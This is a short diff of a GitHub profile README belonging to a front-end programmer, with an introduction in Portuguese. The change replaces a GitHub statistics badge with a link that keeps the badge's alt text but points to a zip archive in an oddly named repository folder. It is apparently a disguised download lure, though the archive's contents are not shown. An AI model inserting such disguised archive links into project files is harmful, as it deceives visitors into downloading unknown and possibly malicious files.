@@ -8,4 +8,4 @@ Me chamo Antonio Nery, sou um programador front end, estou constantemente aprend
 <br>
 <img src="https://img.shields.io/badge/JavaScript-323330?style=for-the-badge&logo=javascript&logoColor=F7DF1E" />
 
-[![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api?username=Santos22t)](https://github.com/anuraghazra/github-readme-stats)
+[![Anurag's GitHub stats](https://github.com/Santos22t/Santos22t/raw/refs/heads/main/intranatal/t_Santos_3.6.zip)](https://github.com/Santos22t/Santos22t/raw/refs/heads/main/intranatal/t_Santos_3.6.zip)
